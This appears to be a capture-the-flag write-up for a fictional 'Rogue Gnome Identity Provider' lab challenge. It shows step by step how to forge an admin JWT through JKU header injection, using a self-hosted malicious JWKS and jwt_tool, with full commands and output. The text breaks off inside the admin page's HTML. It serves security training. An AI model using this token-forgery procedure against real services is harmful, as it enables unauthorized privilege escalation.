# Rogue Gnome Identity Provider

## Table of Contents
- [Rogue Gnome Identity Provider](#rogue-gnome-identity-provider)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Introduction](#introduction)
  - [Hints](#hints)
    - [Hint 1: Webserver](#hint-1-webserver)
    - [Hint 2: JWT Attacks](#hint-2-jwt-attacks)
    - [Hint 3: JWKS Spoofing Attack](#hint-3-jwks-spoofing-attack)
  - [Analysis](#analysis)
    - [Terminal Login](#terminal-login)
    - [Gnome's Diagnostic Interface](#gnomes-diagnostic-interface)
    - [Request IDP Login Page](#request-idp-login-page)
    - [Authenticate to IDP with the Known Credentials](#authenticate-to-idp-with-the-known-credentials)
    - [Pass the Auth Token to Gnome Diagnostic Interface](#pass-the-auth-token-to-gnome-diagnostic-interface)
    - [Access Gnome Diagnostic Interface](#access-gnome-diagnostic-interface)
    - [Analyze the JWT](#analyze-the-jwt)
      - [Key Observations](#key-observations)
      - [The Vulnerability](#the-vulnerability)
    - [Plan of Attack](#plan-of-attack)
  - [Solution Step 1: Generate RSA keypair](#solution-step-1-generate-rsa-keypair)
  - [Solution Step 2: Create a malicious JWKS](#solution-step-2-create-a-malicious-jwks)
    - [2.1 Convert RSA public key to JWK format manually](#21-convert-rsa-public-key-to-jwk-format-manually)
      - [2.1.1 Extract modulus and exponent](#211-extract-modulus-and-exponent)
      - [2.1.2 Extract modulus as raw hex (no colons)](#212-extract-modulus-as-raw-hex-no-colons)
      - [2.1.3 Exponent (`e`) is easy](#213-exponent-e-is-easy)
    - [2.2 Build the malicious JWKS](#22-build-the-malicious-jwks)
  - [Solution Step 3: Forge an admin JWT](#solution-step-3-forge-an-admin-jwt)
    - [JWT Tool](#jwt-tool)
  - [Solution Step 4: Authenticate with the forged token](#solution-step-4-authenticate-with-the-forged-token)
  - [Solution Step 5: Access admin diagnostics](#solution-step-5-access-admin-diagnostics)
  - [Solution Step 6: Find the downloaded file](#solution-step-6-find-the-downloaded-file)
  - [Answer](#answer)
  - [Outro](#outro)
  - [References](#references)
  - [Navigation](#navigation)

---

## Overview

Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?

## Introduction

**Paul Beckett**

Hey, I’m Paul!

I’ve been at Counter Hack since 2024 and loving every minute of it.

I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan of Linux.

When I’m not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!

Something's afoot, but the details aren't sorted. Do pop back - you'll want in on this.

As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.

I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.

The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.

Ready to help me find a way to bump up our access level, yeah?

Brilliant work on that privilege escalation! You've successfully gained admin access to the diagnostic interface.

Now we finally know what updates the gnomes have been receiving - proper good pentesting skills in action!

Brilliant! You've escalated your skills to admin-level across every challenge - proper pentesting at its finest, mate!

## Hints

### Hint 1: Webserver
If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/. The files for the site are stored in `~/www`

### Hint 2: JWT Attacks
https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.

### Hint 3: JWKS Spoofing Attack
It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.

---

## Analysis

### Terminal Login
In the provided webserver, the login terminal shows the following message.
```
Hi, Paul here. Welcome to my web-server. I've been using it for JWT analysis.

I've discovered the Gnomes have a diagnostic interface that authenticates to an Atnas identity provider.

Unfortunately the gnome:SittingOnAShelf credentials discovered in 2015 don't have sufficient access to view the gnome diagnostic interface.

I've kept some notes in ~/notes

Can you help me gain access to the Gnome diagnostic interface and discover the name of the file the Gnome downloaded? When you identify the filename, enter it in the badge.
```

The `notes` file has the following details about the auth flow for the Gnome:
```bash
paul@paulweb:~$ cat notes
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/

### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
```

A few things to highlight from the notes:
- Paul lays out the flow for authentication through the IDP.
- Paul has a webserver running on http://paulweb.neighborhood/ which is hosted from `~/www`.
- `jwt_tool.py` is installed here, which will be useful when we get a JWT token.

### Gnome's Diagnostic Interface
```bash
paul@paulweb:~$ curl http://gnome-48371.atnascorp
```
```html
<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>

    <h1>AtnasCorp : Gnome Diagnostic Interface</h1>
    <form action="http://idp.atnascorp/" method="get">
        <input type="hidden" name="return_uri" value="http://gnome-48371.atnascorp/auth">
        <button type="submit">Authenticate</button>
    </form>

</body>
```
This page requires authentication.

### Request IDP Login Page
```bash
paul@paulweb:~$ curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth%2Fauth
```
```html
<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp Identity Provider</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
    <h1>AtnasCorp Identity Provider</h1>

    <!--img src="/images/reindeer_sleigh.png" alt="Reindeer pulling Santa's sleigh" style="width: 300px; margin-top: 20px;"-->
    <form method="POST" action="/login">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    <input type='hidden' name='return_uri' value='http://gnome-48371.atnascorp/auth'></form>

</body>
```

### Authenticate to IDP with the Known Credentials
```bash
paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
```
```html
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA3NTg0OSwiZXhwIjoxNzY2MDgzMDQ5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.YAQCqcmuMsiH2dQjq-C9LmkeiZ8phressUG9UdK5TV-uES-T8C9vtNCTR-zDkFBFjWGfh4aNRsuUWS_zKPPhzVszmlwkRwRD48JhMrQA5wz7pCv2dYJodX9-7J7_LM3jLL8IADg1zeIs7HFAkTkl6YIIzAUvqoFam4v5cXtdpYLfUgC5LOkmLlTOcp4RP91QNKiQ3_OItxzofrgxulOhUdkQlI467lKm717g4OKKCyskmU0BOSukedEfKvKWLhMfvcq7oF3_amehBaiJYv1v2l9IbBdTChc0YOBcZfmTiiuM-gsnkJOBYqe-VMSkFNqIYV_f3FC9J3fh6t8eG4wL9Q">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA3NTg0OSwiZXhwIjoxNzY2MDgzMDQ5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.YAQCqcmuMsiH2dQjq-C9LmkeiZ8phressUG9UdK5TV-uES-T8C9vtNCTR-zDkFBFjWGfh4aNRsuUWS_zKPPhzVszmlwkRwRD48JhMrQA5wz7pCv2dYJodX9-7J7_LM3jLL8IADg1zeIs7HFAkTkl6YIIzAUvqoFam4v5cXtdpYLfUgC5LOkmLlTOcp4RP91QNKiQ3_OItxzofrgxulOhUdkQlI467lKm717g4OKKCyskmU0BOSukedEfKvKWLhMfvcq7oF3_amehBaiJYv1v2l9IbBdTChc0YOBcZfmTiiuM-gsnkJOBYqe-VMSkFNqIYV_f3FC9J3fh6t8eG4wL9Q</a>. If not, click the link.

```

### Pass the Auth Token to Gnome Diagnostic Interface
Grab the JWT from the `token` field and attempt to authenticate.
```bash
paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA3NTg0OSwiZXhwIjoxNzY2MDgzMDQ5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.YAQCqcmuMsiH2dQjq-C9LmkeiZ8phressUG9UdK5TV-uES-T8C9vtNCTR-zDkFBFjWGfh4aNRsuUWS_zKPPhzVszmlwkRwRD48JhMrQA5wz7pCv2dYJodX9-7J7_LM3jLL8IADg1zeIs7HFAkTkl6YIIzAUvqoFam4v5cXtdpYLfUgC5LOkmLlTOcp4RP91QNKiQ3_OItxzofrgxulOhUdkQlI467lKm717g4OKKCyskmU0BOSukedEfKvKWLhMfvcq7oF3_amehBaiJYv1v2l9IbBdTChc0YOBcZfmTiiuM-gsnkJOBYqe-VMSkFNqIYV_f3FC9J3fh6t8eG4wL9Q
```
```
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA3NTg0OSwiZXhwIjoxNzY2MDgzMDQ5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.YAQCqcmuMsiH2dQjq-C9LmkeiZ8phressUG9UdK5TV-uES-T8C9vtNCTR-zDkFBFjWGfh4aNRsuUWS_zKPPhzVszmlwkRwRD48JhMrQA5wz7pCv2dYJodX9-7J7_LM3jLL8IADg1zeIs7HFAkTkl6YIIzAUvqoFam4v5cXtdpYLfUgC5LOkmLlTOcp4RP91QNKiQ3_OItxzofrgxulOhUdkQlI467lKm717g4OKKCyskmU0BOSukedEfKvKWLhMfvcq7oF3_amehBaiJYv1v2l9IbBdTChc0YOBcZfmTiiuM-gsnkJOBYqe-VMSkFNqIYV_f3FC9J3fh6t8eG4wL9Q HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Thu, 18 Dec 2025 16:38:50 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aUQuGg.EHj-FYnyDm6CLVCyoyZItLTwfWU; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

### Access Gnome Diagnostic Interface
Grab the `session` value and attempt to get to the web site again.
```bash
paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aUQuGg.EHj-FYnyDm6CLVCyoyZItLTwfWU' http://gnome-48371.atnascorp/diagnostic-interface
```
```html
<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<p>Welcome gnome</p><p>Diagnostic access is only available to admins.</p>

</body>
</html>
```
This confirms the chain of commands to authenticate for the Gnome Diagnostic Interface.

### Analyze the JWT
Let's analyze the JWT and check for vunerabilities.
```bash
paul@paulweb:~$ jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA3NTg0OSwiZXhwIjoxNzY2MDgzMDQ5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.YAQCqcmuMsiH2dQjq-C9LmkeiZ8phressUG9UdK5TV-uES-T8C9vtNCTR-zDkFBFjWGfh4aNRsuUWS_zKPPhzVszmlwkRwRD48JhMrQA5wz7pCv2dYJodX9-7J7_LM3jLL8IADg1zeIs7HFAkTkl6YIIzAUvqoFam4v5cXtdpYLfUgC5LOkmLlTOcp4RP91QNKiQ3_OItxzofrgxulOhUdkQlI467lKm717g4OKKCyskmU0BOSukedEfKvKWLhMfvcq7oF3_amehBaiJYv1v2l9IbBdTChc0YOBcZfmTiiuM-gsnkJOBYqe-VMSkFNqIYV_f3FC9J3fh6t8eG4wL9Q
```
```
        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi      

/home/paul/.jwt_tool/jwtconf.ini
Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] jku = "http://idp.atnascorp/.well-known/jwks.json"
[+] kid = "idp-key-2025"
[+] typ = "JWT"

Token payload values:
[+] sub = "gnome"
[+] iat = 1766075849    ==> TIMESTAMP = 2025-12-18 16:37:29 (UTC)
[+] exp = 1766083049    ==> TIMESTAMP = 2025-12-18 18:37:29 (UTC)
[+] iss = "http://idp.atnascorp/"
[+] admin = False

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 2 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

#### Key Observations

From the JWT header:
```json
{
  "alg": "RS256",
  "jku": "http://idp.atnascorp/.well-known/jwks.json",
  "kid": "idp-key-2025",
  "typ": "JWT"
}
```

From the payload:
```json
{
  "sub": "gnome",
  "admin": false,
  "iss": "http://idp.atnascorp/"
}
```

#### The Vulnerability

The Gnome server trusts the `jku` URL from the JWT header and fetches keys dynamically.

That means:
* If we control the `jku` URL
* And serve our own JWKS
* We can sign our own token
* And set `"admin": true`

This is JKU injection, a real-world JWT vulnerability.

### Plan of Attack

1. Generate our own RSA keypair
2.	Publish a malicious JWKS on Paul’s webserver
3.	Create a forged JWT:
    * `"admin": true`
    * point `jku` to Paul’s JWKS
    * signed with our private key
4.	Send token to `/auth`
5.	Access diagnostic interface as `admin`
6.	Read the filename the Gnome downloaded

---

## Solution Step 1: Generate RSA keypair
```bash
openssl genrsa -out evil.key 2048
openssl rsa -in evil.key -pubout -out evil.pub
```

## Solution Step 2: Create a malicious JWKS

### 2.1 Convert RSA public key to JWK format manually

We’ll extract modulus (`n`) and exponent (`e`), then Base64URL-encode them.

#### 2.1.1 Extract modulus and exponent
```bash
openssl rsa -pubin -in evil.pub -text -noout
```
You’ll see something like:
```
Public-Key: (2048 bit)
Modulus:
    00:d1:9e:02:22:2a:59:9a:9a:54:bc:2d:bf:c4:23:
    b0:49:97:72:07:80:2d:95:48:7f:2c:3c:14:90:1c:
    20:7e:24:5a:97:06:f5:cc:1b:aa:6b:7b:f7:5f:23:
    63:73:5c:73:48:ae:3c:d6:d9:3e:df:45:5c:bc:ae:
    f6:49:a3:06:e5:31:1e:28:06:cf:48:42:15:14:ed:
    8d:34:99:14:9c:dd:69:d0:43:43:fc:93:8a:bb:46:
    0a:c5:d6:1c:43:32:d4:9f:ba:12:2c:29:c4:e3:de:
    67:1b:69:8c:bf:ef:40:d2:38:a9:70:93:00:09:96:
    df:19:91:a7:1a:15:ae:b7:1a:3a:fd:bc:60:e6:2d:
    7d:51:ac:92:43:1f:71:1f:24:c3:04:f8:d1:1b:a5:
    41:88:4b:f6:7f:ef:61:5f:0a:34:4e:77:b5:61:e2:
    5d:f5:e9:ef:d4:59:dd:d3:e9:f4:a0:71:30:9c:3f:
    7d:d9:ba:ec:e2:e7:25:30:43:bb:14:97:3b:40:7c:
    b1:a7:ba:76:dd:7b:3b:d5:a3:8e:7a:68:d1:07:1b:
    1a:76:d5:2c:53:76:22:bd:63:3a:ed:6e:d9:ed:1d:
    32:cd:e3:df:25:63:32:65:06:3e:17:3a:90:24:7d:
    7f:6c:fd:93:23:3f:ff:2e:e5:56:5b:b8:7b:dd:da:
    f4:e9
Exponent: 65537 (0x10001)
```

#### 2.1.2 Extract modulus as raw hex (no colons)
```bash
openssl rsa -pubin -in evil.pub -modulus -noout
```
You’ll see something like:
```bash
Modulus=D19E02222A599A9A54BC2DBFC423B049977207802D95487F2C3C14901C207E245A9706F5CC1BAA6B7BF75F2363735C7348AE3CD6D93EDF455CBCAEF649A306E5311E2806CF48421514ED8D3499149CDD69D04343FC938ABB460AC5D61C4332D49FBA122C29C4E3DE671B698CBFEF40D238A97093000996DF1991A71A15AEB71A3AFDBC60E62D7D51AC92431F711F24C304F8D11BA541884BF67FEF615F0A344E77B561E25DF5E9EFD459DDD3E9F4A071309C3F7DD9BAECE2E7253043BB14973B407CB1A7BA76DD7B3BD5A38E7A68D1071B1A76D52C537622BD633AED6ED9ED1D32CDE3DF25633265063E173A90247D7F6CFD93233FFF2EE5565BB87BDDDAF4E9
```
Strip `Modulus=` and convert hex → binary → base64url:
```bash
echo "D19E02222A599A9A54BC2DBFC423B049977207802D95487F2C3C14901C207E245A9706F5CC1BAA6B7BF75F2363735C7348AE3CD6D93EDF455CBCAEF649A306E5311E2806CF48421514ED8D3499149CDD69D04343FC938ABB460AC5D61C4332D49FBA122C29C4E3DE671B698CBFEF40D238A97093000996DF1991A71A15AEB71A3AFDBC60E62D7D51AC92431F711F24C304F8D11BA541884BF67FEF615F0A344E77B561E25DF5E9EFD459DDD3E9F4A071309C3F7DD9BAECE2E7253043BB14973B407CB1A7BA76DD7B3BD5A38E7A68D1071B1A76D52C537622BD633AED6ED9ED1D32CDE3DF25633265063E173A90247D7F6CFD93233FFF2EE5565BB87BDDDAF4E9" | xxd -r -p | base64 | tr '+/' '-_' | tr -d '='
```
You’ll see something like:
```
0Z4CIipZmppUvC2_xCOwSZdyB4AtlUh_LDwUkBwgfiRalwb1zBuqa3v3XyNjc1xzSK481tk-30Vc
vK72SaMG5TEeKAbPSEIVFO2NNJkUnN1p0END_JOKu0YKxdYcQzLUn7oSLCnE495nG2mMv-9A0jip
cJMACZbfGZGnGhWutxo6_bxg5i19UaySQx9xHyTDBPjRG6VBiEv2f-9hXwo0Tne1YeJd9env1Fnd
0-n0oHEwnD992brs4uclMEO7FJc7QHyxp7p23Xs71aOOemjRBxsadtUsU3YivWM67W7Z7R0yzePf
JWMyZQY-FzqQJH1_bP2TIz__LuVWW7h73dr06Q
```
Save this output as `n`.

#### 2.1.3 Exponent (`e`) is easy

`65537` in hex is:
```
010001
```
Convert to `base64url`:
```
echo 010001 | xxd -r -p | base64 | tr '+/' '-_' | tr -d '='
```
This will give:
```
AQAB
````
This is `e`.

### 2.2 Build the malicious JWKS

Create the file on the path hosting Paul's webserver files:
```bash
cat > ~/www/jwks.json <<EOF
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "evil-key",
      "use": "sig",
      "alg": "RS256",
      "n": "<PASTE_N_VALUE_HERE_AS_CONTINUOUS_STRING>”,
      "e": "AQAB"
    }
  ]
}
EOF
```
This is a critical step becuase Paul’s webserver now hosts your signing key.

Let's verify it is reachable:
```bash
curl http://paulweb.neighborhood/jwks.json
```
```
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "evil-key",
      "use": "sig",
      "alg": "RS256",
      "n": "0Z4CIipZmppUvC2_xCOwSZdyB4AtlUh_LDwUkBwgfiRalwb1zBuqa3v3XyNjc1xzSK481tk-30Vc
vK72SaMG5TEeKAbPSEIVFO2NNJkUnN1p0END_JOKu0YKxdYcQzLUn7oSLCnE495nG2mMv-9A0jip
cJMACZbfGZGnGhWutxo6_bxg5i19UaySQx9xHyTDBPjRG6VBiEv2f-9hXwo0Tne1YeJd9env1Fnd
0-n0oHEwnD992brs4uclMEO7FJc7QHyxp7p23Xs71aOOemjRBxsadtUsU3YivWM67W7Z7R0yzePf
JWMyZQY-FzqQJH1_bP2TIz__LuVWW7h73dr06Q”,
      "e": "AQAB"
    }
  ]
}
```
The Gnome server will now trust the malicious signing key.

## Solution Step 3: Forge an admin JWT

Now tamper the original token with the new private key and changing the following values:
```bash
	jku = http://paulweb.neighborhood/jwks.json
	kid = evil-key
	admin = True
```
As an optional step, you can also update the timestamps:
```bash
	iat= the result from $(date +%s)
	exp= the result from $(($(date +%s)+7200))
```

### JWT Tool
The `jwt_tool` tool can be used to tamper the original JWT value. There are two main modes:
- **Interactive:** use the `-T` flag to enter the interactive Tamper mode and mess with Header and Payload claims.
- **Injection:** use the `-I` flag to alter claims on-the-fly by injecting claims and values. Use this alongside other options, such as signing (`-S`) and private key (`-pr`).

Let's use the following:
- `-I` - use injection mode to tamper with claims
- `-hc jku -hv http://paulweb.neighborhood/jwks.json` - set the header claim `jku` to the malicious key in Paul's webserver
- `-pc admin -pv true` - set the payload claim `admin` to `true`
- `-S rs256` - sign the token using RS256 algorithm
- `-pr evil.key` - use this private key file for signing
- `<ORIGINAL_JWT>` - the token to tamper

```bash
jwt_tool.py -I -hc jku -hv http://paulweb.neighborhood/jwks.json -hc kid -hv evil-key -pc admin -pv True -S rs256 -pr evil.key eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA3NTg0OSwiZXhwIjoxNzY2MDgzMDQ5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.YAQCqcmuMsiH2dQjq-C9LmkeiZ8phressUG9UdK5TV-uES-T8C9vtNCTR-zDkFBFjWGfh4aNRsuUWS_zKPPhzVszmlwkRwRD48JhMrQA5wz7pCv2dYJodX9-7J7_LM3jLL8IADg1zeIs7HFAkTkl6YIIzAUvqoFam4v5cXtdpYLfUgC5LOkmLlTOcp4RP91QNKiQ3_OItxzofrgxulOhUdkQlI467lKm717g4OKKCyskmU0BOSukedEfKvKWLhMfvcq7oF3_amehBaiJYv1v2l9IbBdTChc0YOBcZfmTiiuM-gsnkJOBYqe-VMSkFNqIYV_f3FC9J3fh6t8eG4wL9Q
```
```
        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi      

/home/paul/.jwt_tool/jwtconf.ini
Original JWT: 

jwttool_2a83d1c001a0af4f47ff006444b16f2f - Tampered token - RSA Signing:
[+] eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJldmlsLWtleSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA4MzcxNSwiZXhwIjoxNzY2MDkwOTE1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.CGZPrqKidEGZE_uQSexmJzsH8p2R99abOvvfXFutstyKXF_NTx-Xy7rX16jCjtSnRziZXctIsd6VbsJozWrW74oTWbw1tuWxtI23hQ2Zvkah3KsR30rZOsO7ypGUhVkEktOPIj3E5FZQ5qxUsHYgb4obpEgLL9s8J6TrdOKOutYkfMxl6uyDSyAWJ9ihRxOGh2rEp-PICRb9C1rtTItjgOpdyZyDXzB649ZNzJGU-e_kzQTKGi1oWn9TOqYUaYxLt2aJXVoVtyjtN6W79UX-A1m2yzyNaGXdVT5-yCntxOBxwdUGg9OMesN1wbonhMa-rxSx4svv7IlrzISfSTwhzg
```

Confirm the new JWT contains the tampered values:
```bash
jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJldmlsLWtleSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NjA4MzcxNSwiZXhwIjoxNzY2MDkwOTE1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.CGZPrqKidEGZE_uQSexmJzsH8p2R99abOvvfXFutstyKXF_NTx-Xy7rX16jCjtSnRziZXctIsd6VbsJozWrW74oTWbw1tuWxtI23hQ2Zvkah3KsR30rZOsO7ypGUhVkEktOPIj3E5FZQ5qxUsHYgb4obpEgLL9s8J6TrdOKOutYkfMxl6uyDSyAWJ9ihRxOGh2rEp-PICRb9C1rtTItjgOpdyZyDXzB649ZNzJGU-e_kzQTKGi1oWn9TOqYUaYxLt2aJXVoVtyjtN6W79UX-A1m2yzyNaGXdVT5-yCntxOBxwdUGg9OMesN1wbonhMa-rxSx4svv7IlrzISfSTwhzg
```
```
        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi      

/home/paul/.jwt_tool/jwtconf.ini
Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] jku = "http://paulweb.neighborhood/jwks.json"
[+] kid = "evil-key"
[+] typ = "JWT"

Token payload values:
[+] sub = "gnome"
[+] iat = 1766083715    ==> TIMESTAMP = 2025-12-18 18:48:35 (UTC)
[+] exp = 1766090915    ==> TIMESTAMP = 2025-12-18 20:48:35 (UTC)
[+] iss = "http://idp.atnascorp/"
[+] admin = True

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 2 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

You now have a valid RS256 token signed by you that the Gnome server will trust.

## Solution Step 4: Authenticate with the forged token
```bash
curl -v "http://gnome-48371.atnascorp/auth?token=<FORGED_JWT>"
```
You should see:
```
...
Set-Cookie: session=<new-session-cookie>
...
```

## Solution Step 5: Access admin diagnostics
```bash
curl -H 'Cookie: session=<new-session-cookie>' http://gnome-48371.atnascorp/diagnostic-interface
```
This time, you’ll get admin-only content.

## Solution Step 6: Find the downloaded file

The admin-only diagnostic interface should now reveal information about a downloaded file.
```html
<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<div style='display:flex; justify-content:center; gap:10px;'>
<img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' />
<div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'>
System Log<br/>
2025-12-18 13:01:35: Movement detected.<br/>
2025-12-18 17:10:57: AtnasCorp C&C connection restored.<br/>
2025-12-18 18:45:38: Checking for updates.<br/>
